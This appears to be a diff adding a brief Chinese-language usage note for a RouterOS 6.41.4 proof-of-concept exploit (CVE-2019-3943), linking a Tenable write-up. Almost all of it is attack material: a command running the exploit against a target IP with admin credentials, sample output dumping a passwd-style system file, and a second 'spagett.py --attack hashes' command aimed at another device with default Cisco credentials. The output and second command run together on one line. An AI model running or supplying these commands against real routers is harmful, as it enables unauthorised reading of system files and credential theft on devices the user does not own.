@@ -1,0 +1,10 @@
+验证方式：验证文章
+文章链接：https://medium.com/tenable-techblog/routeros-post-exploitation-784c08044790
+目标产品：RouterOS 6.41.4
+poc用法：
+	 ./cve_2019_3943_poc -i 192.168.1.139 -u admin --password lolwat
+
+	=== File Contents (size: 69) ===
+	nobody:*:99:99:nobody:/tmp:/bin/sh
+	root::0:0:root:/home/root:/bin/sh$ python3 spagett.py --attack hashes 192.168.3.13 cisco cisco
+                
